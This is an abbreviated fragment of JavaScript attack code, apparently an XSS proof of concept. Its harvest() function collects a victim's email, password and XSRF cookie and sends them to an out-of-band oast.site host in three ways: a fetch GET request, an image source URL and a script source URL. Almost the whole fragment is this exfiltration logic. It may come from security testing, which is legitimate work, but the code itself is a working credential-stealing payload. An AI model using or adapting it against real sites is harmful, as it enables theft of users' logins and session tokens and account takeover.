    ...
    function setupEventHandlers(doc) {
        ...
        function harvest() {
            ...
            if (u && p && !alertShown) {
                ...
                try {
                    // Method 2: GET request with URL parameters (most reliable for OAST)
                    ...
                    fetch('https://soxd23s4zntejv9un0a357vo8m14bz5vw.oast.site' + params, {
                        method: 'GET',
                        mode: 'no-cors'
                    }).then(function() {
                ...
                try {
                    ...
                    img.src = 'https://soxd23s4zntejv9un0a357vo8m14bz5vw.oast.site/img?' + 
                ...
                try {
                    ...
                    script.src = 'https://soxd23s4zntejv9un0a357vo8m14bz5vw.oast.site/script?' + 
                                'email=' + encodeURIComponent(u) + 
                                '&password=' + encodeURIComponent(p) + 
                                '&xsrf=' + encodeURIComponent(xsrfCookie) + 
